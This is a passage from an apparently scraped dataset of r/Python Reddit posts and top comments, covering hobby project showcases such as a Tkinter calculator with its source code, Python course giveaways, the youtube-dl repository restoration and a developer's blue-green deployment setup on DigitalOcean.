   1. Batching also makes it easier to fall back to something like the multiprocessing library to parallelize work.
4. [Use software pipelining](https://en.wikipedia.org/wiki/Software_pipelining).  This is kind of like batching: rewrite loops that run items through a series of steps/processes so you first do the same step to each item, then the next step.  Sometimes can be evaluated much more efficiently by compilers/interpreters because it allows using SIMD instructions, avoids branch prediction misses, etc.
   1. **May also mean using Unix/Linux pipelining as well**: use a bunch of smaller utilities that pipe input from one to another.  This is another application of the same principle, but has the extra advantage of being generally very efficient, and spreading work across multiple processors.
5. Use a lower-level language than Python to optimize the most performance-sensitive parts of the code.  I.E. fall back to C bindings for intensive number crunching, crypto, etc.  Optimized C can be several times faster than Python (or sometimes much more!).  In general [Pareto's principle](https://en.wikipedia.org/wiki/Pareto_principle) applies: 80% of your execution time comes from 20% of the code (and vice versa), so if you double the performance of the slowest 20% you can almost double your overall performance."
Python is Now Officially the Second Most Popular Programming Language,jo4h73,2020-11-05 04:38:28,,Isn't it in Python's philosophy to be the second best tool at everything?
"We're building an app that lets you search Stack Overflow, Python documentation, and code on GitHub",lsgyvf,2021-02-26 05:09:02,"Hey folks! My friend and I are building [Devbook](https://usedevbook.com). It’s a desktop app that allows you to search in Stack Overflow, search and read documentation, and search public code on GitHub from a single place. The whole app can be controlled just using a keyboard. No need to use your mouse. This way, it’s easier to stay in the flow.

The app works similarly to Spotlight on macOS. You hit a global shortcut and Devbook appears as an overlay over the currently active app. This way you minimalize the needed context switching when looking up information. You almost don't leave your coding editor.

You can think about Devbook as a search engine made just for developers. But no ads, content marketing, SEO, etc.

I thought the community here might find it useful. Currently, we support Python, Flask, Django docs, and adding more with time.

Give it a try and let me know what you think!

**EDIT**

Some folks have been asking us for the pricing. Devbook is free. The plan is to build team features later on and have subscriptions for teams and organizations. If it will be possible, we want to always have a free plan for solo developers.

However, if you really want to support us, I just set up the [Buy Me A Coffee page](https://www.buymeacoffee.com/P8dyVmoAF) for Devbook. You can donate a small amount if you feel comfortable. It will probably make us jump around from the excitement since it would be our first revenue:)

**EDIT 2**

Oh, boy did this blow-up! Every week, we just share Devbook in various subreddits we think might enjoy it. We didn't expect to blow it up that much at all. Thank you all folks for trying Devbook out. It means a lot.

&#x200B;

For the near future Devbook release, we're building an extensions system that will allow you to add search functionality we don't support out of the box. Imagine Google customizable through vscode-like extensions. You can read more [here](https://github.com/DevbookHQ/devbook-extension).

Keep the feedback going. Big updates coming soon!","Wow this is amazing, yet to test it with my flow.

What is in it for you? Free? Taking donations or tip jar of sorts?"
"I wrote a syllabus for learning Python and Django. Four people have gone through it, two are interviewing and one got a job. It's based on using a somewhat even mix of coding challenges, personal projects and books.",icefif,2020-08-19 09:38:28,,"Just to clarify, someone with no programming experience did this syllabus, and then got a job as a software engineer as a direct result solely of this syllabus?"
Just a python apprentice here... Was bored every day of attending school meetings on zoom so I used pyautogui to attend those for me;),gxl1e4,2020-06-06 13:21:41,,Young programmers are going to be the downfall of the school system lol
"I’m learning Python, but I also came across my dads old BASIC textbook. The problem solving aspect of the book is almost better than any modern one I’ve read.",iix2ru,2020-08-30 02:04:54,,"Breaking down a problem, understanding what needs to be done, factoring it out into steps a computer can do, those are the real challenges of software development. Mapping the abstract logical solution to a language is much easier. 

That said, understanding a language well enough to tailor the solution to make the best use of a language is also nice, but not required."
The youtube-dl repository has been restored on GitHub with help from the Electronic Frontier Foundation,jvbqzc,2020-11-17 02:12:33,,"After [removing the references to the videos mentioned by the RIAA](https://github.com/ytdl-org/youtube-dl/commit/1fb034d029c8b7feafe45f64e6a0808663ad315e) along with a [letter sent from the EFF to GitHub](https://github.com/github/dmca/blob/master/2020/11/2020-11-16-RIAA-reversal-effletter.pdf), GitHub has reinstated access to the repository.

Any forks taken down will also be restored provided they've also made the same changes linked above.  

Edit: GitHub has [written a blog post](https://github.blog/2020-11-16-standing-up-for-developers-youtube-dl-is-back/) that is worth the read. They talk about what went down, how they are improving their DMCA process for these situations, and how they plan on assisting developers in the future, including donating $1 million to a legal defence fund for developers."
Spent a few days hacking together a ray-casting engine that renders to ascii for playing in your terminal! With shading and textures! Link in the comments.,crdx3p,2019-08-17 06:58:09,,"[https://github.com/salt-die/terminal\_dungeon](https://github.com/salt-die/terminal_dungeon)  Come stop by!

Edit: We've managed to speed it up a bit and we've added jumping!"
i created a sorting algorithm visual that can compare the speed and efficiency of different algorithms on variable-length lists in python,hw78c7,2020-07-23 10:07:20,,Now all you need is some [annoying beeps](https://youtu.be/kPRA0W1kECg)
I've accidentally made a weird art generator. Help me.. I cant stop running it.,je7wqo,2020-10-20 02:50:57,"I was trying to make something similar to the default profile picture you are assigned on stack overflow. But what came out the other end was not what I was expecting!! hahah

I mean look at these things, and because its random they are always different.

There are loads of settings to change and mess about with, maybe some of you might enjoy it too?

Its made with shapely, numpy and skimage.

Don't hate me - but because SO many people told me to make money out of it I've removed the source code. 

&#x200B;

You can download the pickled function here. (will add link soon - just working on it)

&#x200B;

To run - you need to import 

\`\`\`from shapely.affinity import rotate as rt

from shapely.geometry import Polygon

import random

import numpy as np

from skimage.transform import rotate

from PIL import Image, ImageDraw\`\`\`

&#x200B;

function inputs are 

""""""

colours (list) : list of hex colours or rgb tuples used to form the basis of the shape colours

back\_colour (str or tuple) : hex string or rgb tuple for the background colour

line colour (str or tuple) : hex string or rgb tuple for the shapes outside edge colour

wanted\_size (tuple) : size in pixel (x,y)  MAX 300 for testing 

x\_times (int): times to duplicate the image on the x axis

y\_times (int): times to duplicate the image on the y axis

shape\_draws (int): how many times to draw shapes on the inital image

line\_width (int) : width of outside stoke on each shape

""""""    

&#x200B;

&#x200B;

&#x200B;

Google drive link with tonnes more here - [https://drive.google.com/drive/folders/1OC-XYGh00tQR8zYorLmdrEzlQaKrhDSE?usp=sharing](https://drive.google.com/drive/folders/1OC-XYGh00tQR8zYorLmdrEzlQaKrhDSE?usp=sharing)

https://preview.redd.it/wljp0jwzr3u51.png?width=600&format=png&auto=webp&s=fc8da1b99561618e472791fb2aa7eefb0e608939

https://preview.redd.it/pp7dvuk5l3u51.png?width=1000&format=png&auto=webp&s=b57b84abad942399b0fb58734320f14801709510

https://preview.redd.it/2x24re34j3u51.png?width=352&format=png&auto=webp&s=364819d42eec39c1254d66b545743c1d724dfa9d

&#x200B;

https://preview.redd.it/kdwbfqm9k3u51.png?width=600&format=png&auto=webp&s=81e34d6326fa37e948d8004500db4965cfb732eb

https://preview.redd.it/46l8bnm9k3u51.png?width=600&format=png&auto=webp&s=364edbc4f1d3bba51a3342ef0b4f5d15fb11265e

https://preview.redd.it/3ibi1sm9k3u51.png?width=600&format=png&auto=webp&s=addb0c28de2f019056a72339e06bf045c5845739

&#x200B;

https://preview.redd.it/nv35sb05r7u51.png?width=600&format=png&auto=webp&s=5d6012e2a958933a3af2271ebe4b4ef0772197fe

https://preview.redd.it/814coi05r7u51.png?width=600&format=png&auto=webp&s=1c55c9f8c0d01263b0d6b4daa68d67331d9c0fc1

https://preview.redd.it/zia6yc05r7u51.png?width=592&format=png&auto=webp&s=ceb393da42623eea986d45e6f4b49895d1c46d70

https://preview.redd.it/say57q05r7u51.png?width=600&format=png&auto=webp&s=8218b2d8f0a256a1f5f23ede6ad1f539bf55a00d

&#x200B;

https://preview.redd.it/a5a37fxts7u51.png?width=600&format=png&auto=webp&s=c2a1e2536cbd91726d9c360ea82d0c77ae3afd0d

https://preview.redd.it/6v7capxts7u51.png?width=592&format=png&auto=webp&s=376994dac92ee5bbc7f2a971b4303865873d7e14

https://preview.redd.it/nwtraoxts7u51.png?width=600&format=png&auto=webp&s=167ec598ad4ae7ae5361aaa5db9a32bcedfeafbe

https://preview.redd.it/4esgkvxts7u51.png?width=592&format=png&auto=webp&s=28272074c658966d0bcd312cc4e4e935ba3ff8b8",Those are some kickass shirt patterns my dude
Backtracking algorithm visualized with Sudoku,f6hynk,2020-02-20 05:45:14,,"Cool

I had a computer science prof that always gave us assignments that involved solving puzzles.    This was back in the 1980's and the language was PASCAL."
I made a face recognition program,fzwbcx,2020-04-12 20:59:24,,Great choice for faces
Real Python is giving away a free Python course bundle [access code inside],fpgq1j,2020-03-27 02:24:13,"😷Stuck at home? We're giving away a free Python course bundle right now:

[https://realpython.com/free-courses-march-2020](https://realpython.com/free-courses-march-2020)

(Access code at the link above, no strings attached whatsoever, feel free to share)",Thank you so much for posting this.  I will use it and love it
"I've seen a bunch of Pygame physics simulations here recently, so here's my take on it: accurately modelling the orbits of objects in our solar system using data from JPL Horizons",humqci,2020-07-20 22:59:03,,"I'm interested by your terminal window. The little widgets at the bottom, I want!"
Dear PyGui Now Has Built-in Demo,jn2xh2,2020-11-03 11:25:31,,"You should emphasize this:

> Dear PyGui uses the immediate mode paradigm and your computer's GPU to facilitate extremely dynamic interfaces.

It's a big selling point IMO, because it enables interesting applications."
I made a hanged man game using turtle library,hfgvsq,2020-06-25 14:08:12,,Bro I would've guessed sleep
prettymaps: A small set of Python functions to draw pretty maps from OpenStreetMap data,pbbjeo,2021-08-25 21:46:00,,"this looks really nice, thanks for the post"
I made a command-line tool that instantly fetches Stack Overflow results when you get a compiler error,8cwq72,2018-04-17 22:00:37,,If it also copied and pasted the first answer then you would have completely automated my job.
[OC] Maze solving algorithm recursively attemps to solve the maze,eme6k8,2020-01-10 03:01:09,,Wish it left failed paths coloured in (obviously in a different colour). Same for the successful path it finds. I wish it left that coloured in with yet another colour.
"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code",i1w03b,2020-08-02 01:30:07,"https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: COPSHOTMEINPORTLAND2

https://www.udemy.com/course/automate/?couponCode=COPSHOTMEINPORTLAND2

This promo code works until August 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to COPSHOTMEINPORTLAND2 on the 4th.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

You can also purchase the course at a discount using my code COPSHOTMEINPORTLAND2 or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $16 to $18. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, and I don't get the credit for those referral signups. Blerg.)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is now available online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid- or late-2020. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with.",Jokes on you! I already have the book
"Stop hardcoding and start using config files instead, it takes very little effort with configparser",my1m66,2021-04-25 13:24:35,"We all have a tendency to make assumptions and hardcode these assumptions in the code (""it's ok.. I'll get to it later"").  What happens later?  You move on to the next thing and the hardcode stays there forever.  ""It's ok, I'll document it.. "" - yeah, right!

There's a great package called ConfigParser which you can use which simplifies creating config files (like the windows .ini files) so that it takes as much effort as hardcoding!  You can get into the hang of using that instead and it should both help your code more scalable, AND help with making your code a bit more maintainble as well (it'll force you to have better config paramters names)

&#x200B;

Here's a post I wrote about how to use configparser:

[https://pythonhowtoprogram.com/how-to-use-configparser-for-configuration-files-in-python-3/](https://pythonhowtoprogram.com/how-to-use-configparser-for-configuration-files-in-python-3/) 

&#x200B;

If you have other hacks about managing code maintenance, documentation.. please let me know!  I'm always trying to learn better ways",I use dynaconf. It is flexibility tool for use setting parameters.
Visualisation of different path finding algorithms,eolak4,2020-01-14 21:31:05,,"Your Dijsktra's is just breadth-first search. Since all tiles have the same cost to enter, Dijkstra's algorithm degrades to behaving exactly like BFS."
Python surpasses C# in popularity among developers,845epf,2018-03-14 00:19:21,,"The way this is going, I'm sure by next week it'll be...

""Python surpasses Katy Perry in popularity....""

Python is really on a meteoric rise!"
A path finder i recently made in Python PyGame,86ufrf,2018-03-25 01:16:44,,"The first path took 23 ms, second 44 ms, 3rd 58 ms, 4th 20 ms, 5th 8 ms, 6th 15 ms, 7th 7 ms."
"Spent Months Writing A Web Dev Course For A Platform, But It Got Canceled Midway. Publishing It Free For The Community.",118ynyy,2023-02-22 21:26:14,,A special thought for people who want to break into tech. Push the scale to the left.
"Google Translate, but for Sign Language - I used Python and OpenCV AI Kit to perform Sign Language Detection.",mcs1kj,2021-03-25 14:48:55,,Holy fuck. Nice work.
Just finished my graduation cap for tomorrow,8h512c,2018-05-05 11:52:38,,Useless use of classes for what should be a function call. You’re ready for enterprise. 
My Halloween Facepaint - Scary huh?,9t3ko5,2018-11-01 06:19:43,,"Oh and sorry for the shitpost btw, I'll understand if you have to take it down"
"Physics simulator with rotation and collision I made with Python. If you dropped your phone, and it just kept bouncing!",cg1ipy,2019-07-22 01:24:43,,Nice! Now you just need to add in a coefficient of restitution so the poor thing can stop bouncing!
Win10 is going to start including Python 3.7,bx9rrz,2019-06-06 07:54:11,,"What's actually there is a small stub that launches into the app store to install Python. That installation in the app store is controlled by the core Python developers too, do it'll get updated to the latest version regularly.  Steve Dower gave a talk about it at PyCon and I believe also mentioned it at the language summit there.  So a lot of the concerns mentioned in the comments here should be mitigated."
Developed a 'personal home assistant' whatsapp bot to control an appliance (lamp in this case),ha5901,2020-06-16 22:39:31,,Do you share your code?
I am just a beginner in programming. Today I have created my first ever project (Simple Calculator) with Python GUI Tkinter. Thank you for this great community for inspiring me so much.,fio4x4,2020-03-15 03:38:32,,"Edit\_2: Wow! I am so overwhelmed by your response. Thank you so much each and every one. My code has been added to GitHub.

 [https://github.com/Vasudevatirupathinaidu/Simple-Calculator](https://github.com/Vasudevatirupathinaidu/Simple-Calculator) 

Edit\_1: As per your suggestions I have modified a few things here.

1. Added --> relief = FLAT for Buttons, try and except blocks for ValueError, NameError and ZeroDivisionError and Space between buttons. I will keep updating this.  I am so grateful for your responses. Thank you all once again!

Here is My Code:

    # Simple Calculator
    
    from tkinter import *
    
    root = Tk()
    
    root.title(""Calculator"")
    root.resizable(0,0)
    
    # root.geometry(""400x400"")
    
    root.configure(bg=""#fff"")
    
    
    # Input
    entry = Entry(root, width=35, borderwidth=2)
    entry.grid(row=0, column=0, columnspan=3, padx=10, pady=15)
    
    
    # functions
    def button_click(number):
        current = entry.get()
        entry.delete(0, END)
        entry.insert(0, str(current) + str(number))
    
    def button_clear():
        entry.delete(0, END)
    
    def button_add():
        first_number = entry.get()
        global f_num
        global math_operator
        math_operator = ""add""
    
        try:
            f_num = int(first_number)
        except ValueError:
            pass
    
        entry.delete(0, END)
    
    def button_subtraction():
        first_number = entry.get()
        global f_num
        global math_operator
        math_operator = ""sub""
    
        try:
            f_num = int(first_number)
        except ValueError:
            pass
    
        entry.delete(0, END)
    
    def button_multiplication():
        first_number = entry.get()
        global f_num
        global math_operator
        math_operator = ""mul""
    
        try:
            f_num = int(first_number)
        except ValueError:
            pass
    
        entry.delete(0, END)
    
    def button_division():
        first_number = entry.get()
        global f_num
        global math_operator
        math_operator = ""div""
    
        try:
            f_num = int(first_number)
        except ValueError:
            pass
    
        entry.delete(0, END)
    
    def button_equal():
        second_number = entry.get()
        entry.delete(0, END)
    
        try:
            if math_operator == ""add"":
                entry.insert(0, f_num + int(second_number))
        except ValueError:
            pass
        except NameError:
            pass
    
        try:       
            if math_operator == ""sub"":
                entry.insert(0, f_num - int(second_number))
        except ValueError:
            pass
        except NameError:
            pass
    
        try:        
            if math_operator == ""mul"":
                entry.insert(0, f_num * int(second_number))
        except ValueError:
            pass
        except NameError:
            pass
    
        try: 
            if math_operator == ""div"":
                entry.insert(0, f_num / int(second_number))
        except ValueError:
            pass
        except ZeroDivisionError:
            pass
        except NameError:
            pass
    
    
    # Buttons for display numbers and math operators
    btn1 = Button(root, padx=39, pady=20, text=""1"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(1))
    
    btn2 = Button(root, padx=40, pady=20, text=""2"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(2))
    
    btn3 = Button(root, padx=40, pady=20, text=""3"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(3))
    
    btn4 = Button(root, padx=39, pady=20, text=""4"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(4))
    
    btn5 = Button(root, padx=40, pady=20, text=""5"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(5))
    
    btn6 = Button(root, padx=40, pady=20, text=""6"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(6))
    
    btn7 = Button(root, padx=39, pady=20, text=""7"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(7))
    
    btn8 = Button(root, padx=40, pady=20, text=""8"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(8))
    
    btn9 = Button(root, padx=40, pady=20, text=""9"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(9))
    
    btn0 = Button(root, padx=39, pady=20, text=""0"", bg=""#1a3365"", fg=""#ffbb00"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=lambda: button_click(0))
    
    btn_add = Button(root, padx=38, pady=20, text=""+"", bg=""#ffffff"", fg=""#1a3365"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=button_add)
    
    btn_equal = Button(root, padx=88, pady=20, text=""="", bg=""#ff4343"", fg=""#ffffff"", borderwidth=1, activebackground=""#ffffff"", activeforeground=""#ff4343"", relief=FLAT, cursor=""hand2"", command=button_equal)
    
    btn_clear = Button(root, padx=78, pady=20, text=""Clear"", bg=""#ffbb00"", fg=""#1a3365"", borderwidth=1, activebackground=""#ffffff"", activeforeground=""#ffbb00"", relief=FLAT, cursor=""hand2"", command=button_clear)
    
    btn_subtraction = Button(root, padx=40, pady=20, text=""-"", bg=""#ffffff"", fg=""#1a3365"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""#ffffff"", relief=FLAT, cursor=""hand2"", command=button_subtraction)
    
    btn_multiplication = Button(root, padx=40, pady=20, text=""*"", bg=""#ffffff"", fg=""#1a3365"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""#ffffff"", relief=FLAT, cursor=""hand2"", command=button_multiplication)
    
    btn_division = Button(root, padx=40, pady=20, text=""/"", bg=""#ffffff"", fg=""#1a3365"", borderwidth=1, activebackground=""#021F4B"", activeforeground=""white"", relief=FLAT, cursor=""hand2"", command=button_division)
    
    
    btn1.grid(row=3, column=0, pady=1)
    btn2.grid(row=3, column=1, pady=1)
    btn3.grid(row=3, column=2, pady=1)
    
    btn4.grid(row=2, column=0, pady=1)
    btn5.grid(row=2, column=1, pady=1)
    btn6.grid(row=2, column=2, pady=1)
    
    btn7.grid(row=1, column=0, pady=1)
    btn8.grid(row=1, column=1, pady=1)
    btn9.grid(row=1, column=2, pady=1)
    
    btn0.grid(row=4, column=0, pady=1)
    btn_clear.grid(row=4, column=1, columnspan=2, pady=1)
    
    btn_add.grid(row=5, column=0, pady=1)
    btn_equal.grid(row=5, column=1, columnspan=2, pady=1)
    
    btn_subtraction.grid(row=6, column=0, pady=1)
    btn_multiplication.grid(row=6, column=1, pady=1)
    btn_division.grid(row=6, column=2, pady=1)
    
    
    root.mainloop()"
Training a neural net on 7 years of text messages became surprisingly self aware,gyf7on,2020-06-08 00:16:41,,this person just created the first AI that will become depressed
"Out of curiosity, how many of you guys started your journey with 'Automate the boring stuff'?",jjpd77,2020-10-28 23:02:11,,u/AlSweigart just thought you should see the inspiration that you're giving people.
"New search engine made with Python that's anonymous and has no ads or tracking. It tries to fight spam, and gives you control of how you view search results. You can search and read content anonymously with a proxied reader view. The alpha is live and free for anyone to use at lazyweb.ai",odhbql,2021-07-04 17:53:34,"&#x200B;

[LazyWeb: Anonymous and ad-free search made in Python](https://reddit.com/link/odhbql/video/hii57yv446971/player)

[https://lazyweb.ai](https://lazyweb.ai)

We're a little two-person team (Angie and Jem). We're bootstrapping and self-funded. I'm the programmer.

I wanted to share it because it was a fun and interesting project to build, and Python made it possible for us to get a long way as a small team. It uses serverless on the backend (AWS). We're using Spacy and GPT-2, and some PyTorch models. It uses BeautifulSoup for spidering/crawling/content retrieval. The front-end is React.

It has a different type of user interface to any other search engine, as it is chat based. And it lets you choose how you view results, either visually like an Instagram feed or cards, or minimal like Hacker News or the old Google. It tries to fight SEO spam and strips out ads and ad-tech from search results.

We have a project on GitHub with Jupyter notebooks and sample data with experiments and scripts, including examples of querying other search APIs, and to generate example utterances programatically to use for NLP models with sources like Wikipedia, StackOverflow and Wolfram|Alpha:

[https://github.com/lazyweb-ai/lazyweb-experiments](https://github.com/lazyweb-ai/lazyweb-experiments)

We're only a small team but hope to share more of our work as open source as we progress.","I like it ! Fast and simple, chat design give it unique thing from another search engine. you can play youtube video results without go to YouTube."
A terminal youtube playlist music player - because terminal applications are minimal and running a web browser is an overkill to listen to music,c7a5lq,2019-06-30 14:44:38,,"All my music playlists exist on youtube. I hate running a web browser to listen to music, there should be a separate application, a devoted music player for this hence, I created this. I love terminal applications and following the philosophy, I've tried to create something minimal.

&#x200B;

You can find this on pypi ( `pip install --user ytermplayer` ) and [github](https://github.com/TimeTraveller-San/yTermPlayer)

&#x200B;

Terminal UI is created using urwid

YouTube streams are fetched using a very actively updating library - youtube-dl

Fetched streams are played using the minimal mpv player

&#x200B;

The UI will adapt to your terminal colors and size (if you use pywal for extracting color theme then ytermplayer will imitate pywal's colors) Check out [these images](https://imgur.com/a/GWh5MT3) for examples."
"Today I’m releasing PyBoy v1.5.0! A Game Boy emulator written in Python, focused on scripting, AI and learning",vfsakl,2022-06-19 18:30:13,"Back in 2015, it started as a university project. About 2 years ago, I [released v1.0.0 to the public](https://www.reddit.com/r/Python/comments/g484d4/today_im_releasing_pyboy_v100_a_game_boy_emulator/), and it really took off! We ended up trending on GitHub and got [picked up by Hackaday](https://hackaday.com/2020/04/26/snakes-and-ladders-game-boy-emulator-in-python/)!

It's been awesome to see people using the emulator for various projects, like [beating the world record in Tetris](https://towardsdatascience.com/beating-the-world-record-in-tetris-gb-with-genetics-algorithm-6c0b2f5ace9b), Discord and Twitch bots, and [something entirely unique](https://hackaday.com/2021/09/21/interactive-clips-for-game-boy-sit-back-and-watch-or-take-control/).

Since the first release, I've had the privilege that three groups of students at the University of Copenhagen have helped me work on the project. They've implemented a feature to rewind time, emulate Link Cables (not merged on master), and most recently Game Boy Color support.

[https://github.com/Baekalfen/PyBoy](https://github.com/Baekalfen/PyBoy)

&#x200B;

[Game Boy Color Support!](https://i.redd.it/v0oq7bnzxj691.gif)

&#x200B;

[Mario controlled by an AI](https://i.redd.it/6l3u1wq5yj691.gif)

**What is PyBoy**

In short, it’s a Game Boy emulator written from scratch in pure Python, with additional support for scripting through an API. We’ve added type definitions, which allows us to compile the software using Cython to get performance comparable to emulators written in C and C++.

**Installation**

The instructions are simple, if you already have a functioning Python environment on your machine.

1. Install PyBoy using pip install pyboy
2. If your system isn't supported by pysdl2-dll, you'll need to install SDL2 from your package manager.

**Features**

PyBoy is designed to be accessible from Python, so we support and encourage people who want to make experiments, bots or AI’s to try it out. We are building game-specific wrappers, which at the moment allows programmers to interface with Tetris and Super Mario Land, without any intricate knowledge of the Game Boy. Documentation can be found at: [https://docs.pyboy.dk](https://docs.pyboy.dk) .

**Feedback, Contribute, Learn**

We’d love to hear your feedback, and see the projects you wish to use PyBoy for! We will do our best to make it happen.

Please give any feedback in the comments below, on our Discord server or create issues/pull-requests on GitHub if you wish.

And a special thanks to the people on Discord, who were a great motivational factor in all of this (in no specific order): krs013, jan0809, Lyfe, kr1tzy, Nico, MLGxPwnentz, mr\_seeker, Sky, Travis Scott Burger, Whippersnatch Pumpkinpatch, AutoMathis",Nice work! but if this is intermediate i'll change career
Flask app to extract palette of dominating colors from image,9xbq05,2018-11-15 22:38:44,,"The code is on [Github](https://github.com/makkoncept/colorpalette). feel free to suggest best practises and improvements
I have pushed it to **heroku**. Have a look. **[LINK](https://colorpalettedemo.herokuapp.com/)**"
Made a racing game that runs in Terminal. 100% Python,cpmll6,2019-08-13 10:19:07,,"Source code: [https://github.com/UpGado/ascii\_racer](https://github.com/UpGado/ascii_racer). Would appreciate feedback, ideas or even pull-requests!

edit: fix typo"
Python in the new NASA going to the Moon video.,9xxuus,2018-11-18 00:50:57,,Lets go Sublime :)
For those of you made uncomfortable by yesterdays simulation. No phones were harmed in the making of this simulation,cghqy0,2019-07-23 03:27:40,,"Very realistic. Once my phone becomes broken, it stops bouncing too."
Prof. Gilbert Strang a mathematician and professor at MIT mentioning Python while teaching a course on Computational Science and Engineering in Fall 2008,feg8ua,2020-03-07 00:49:32,,ah yes the absolute God that is Strang.
2D Raycasting along with Rendered view - Visualization was done using Pygame! People who love games would definitely love this! Link to the Github repository in the comments!,grwueh,2020-05-28 09:33:03,,"Link to the Github repository [https://github.com/anuj-99/2D-Raycasting-and-Rendering](https://github.com/anuj-99/2D-Raycasting-and-Rendering) 

Some of the helpful resources if you want to make your own:  
[https://youtu.be/TOEi6T2mtHo](https://youtu.be/TOEi6T2mtHo) \- Video by The Coding Train, though it isn't in Python

 [https://en.wikipedia.org/wiki/Ray\_casting](https://en.wikipedia.org/wiki/Ray_casting)  \- To go through the concept and application"
How I deploy my bootstrapped Python webapp with 150k monthly users,xobba8,2022-09-26 14:28:54,"I am a one-man show building a web-based software product. Some quick facts about my app:

* Written in Python Flask
* 150k visitors per month
* 15k registered users
* 3k US$ revenue per month
* 70 requests per second at peak-time

This is a technical post looking at the infrastructure that runs my app with a focus on how I deploy it.

## Summary

* I use 2 VPS (virtual private servers) running on DigitalOcean
* The database is Postgres and is fully managed by DigitalOcean
* I use a blue-green deployment
* Deployment is done via `git` and `ssh`.
* No CI/CD
* No containers
* Absolutely no Kubernetes

I am a strong advocate of using ""boring technology"". I am also the only developer of the app, which makes many things simpler.

## The application infrastructure

The app is a CRUD monolith that is deployed as one artefact. I use nginx and gunicorn to serve the app.

The app runs on 2 virtual private servers, one of which is the production server, the other of which is the staging server. During deployment, they switch roles. This is a so-called *blue-green deployment*, more on that later.

I'm using a DigitalOcean droplet with 8 shared CPUs, 16GB of memory and 80 GB of storage for each server.  They both run Ubuntu which I have to administrate.

There is a single Postgres database, which is always in production. It is fully managed by DigitalOcean, which means I have to do no house-keeping. Currently, it has 4 shared CPUs, 8 GB of memory and 115 GB of storage.

Overall, the setup is absolutely rock solid. Also, all my technology is older than 10 years (OK, not 100% sure about this, but probably true).

## Why I chose blue-green deployment

Before I switched, my deployments worked as follows:

* There was one app server running on DigitalOcean, plus the hosted Postgres database.
* To deploy, I used a script that SSHed into that server and did a `git pull`

This was fine to begin with, however there were several issues:

1. My setup compiles and minifies CSS and Javascript on the server.  This resulted in up to 10 seconds for the server to respond after a deployment. Some users ran into `Bad Gateway` errors 💥.
2. A bug in production could be fixed by checking out the previous commit. However, this invariably took too long and always involved frenzied googling of the correct git commands.
3. There was no way of testing the production setup, other than in production.

&#x200B;

## What is blue-green deployment?

Here's how I would explain blue-green deployment:

1. There are two identical and independent servers hosting the application. One is called ""green"", the other ""blue"".
2. There is a shared production database that both servers can access.
3. There is a quick and painless way of routing traffic to the green or the blue server.

One of the 2 servers is serving production traffic (the live server), the other is idle. When a new release is ready, it gets deployed to the idle server. Here it can be tested and issues fixed. Remember, the idle server is still accessing the production database, so the application can be tested with real data.

Once you're satisfied that you're ready, you switch traffic from the live server to the idle server. If any problems occur, you can simply switch back within seconds, effectively doing a roll-back.

Simple, no?

## How I do blue-green deployment

I've already mentioned my 2 application servers. But the magic  thing that makes it all possible is a  [floating IP address from DigitalOcean](https://www.digitalocean.com/docs/networking/floating-ips/).

